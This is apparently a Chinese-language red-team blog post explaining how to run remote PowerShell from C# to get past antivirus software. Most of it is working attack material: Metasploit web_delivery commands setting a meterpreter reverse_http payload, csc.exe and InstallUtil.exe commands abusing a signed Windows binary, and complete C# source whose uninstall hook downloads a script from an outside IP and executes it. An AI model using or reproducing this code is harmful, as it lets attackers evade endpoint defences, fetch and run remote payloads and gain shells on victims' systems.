---
title: c# 远程执行命令
date: 2019-08-26 24:00:00
tags: redteam 红队
author: lostwolf                
---

一般直接执行powershell会被大多数杀毒软件拦截，利用`c#` **Pipeline** 执行远程powershell来绕过杀毒软件

[参考来源:tsscyber](https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997)

```bat
use multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_http
set target 2
...
run -j
...
c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:ps.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=True /u .\ps.exe
```

```powershell
using System;
using System.Net;
using System.IO;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;


public class Program
 {
 public static void Main()
 {
	 //Console.WriteLine("test");
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
WebClient client = new WebClient();
//远程执行命令
Stream stream = client.OpenRead("http://11.11.11.11/powershell.txt");
StreamReader reader = new StreamReader(stream);
String command = reader.ReadToEnd();
//Console.WriteLine(text);

 //string command = System.IO.File.ReadAllText(text);
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.InvokeAsync();
	while(pipeline.PipelineStateInfo.State == PipelineState.Running || pipeline.PipelineStateInfo.State == PipelineState.Stopping) {
		System.Threading.Thread.Sleep(50);
	}
	Console.WriteLine("startasdfasdfasdf");
	
	foreach (object item in pipeline.Output.ReadToEnd())
	{
        if(item != null) {
            Console.WriteLine(item.ToString());
		}
	}
	foreach (object item in pipeline.Error.ReadToEnd())
	{
        if(item != null) {
            Console.WriteLine(item.ToString());
		}
	}
 }
 }
```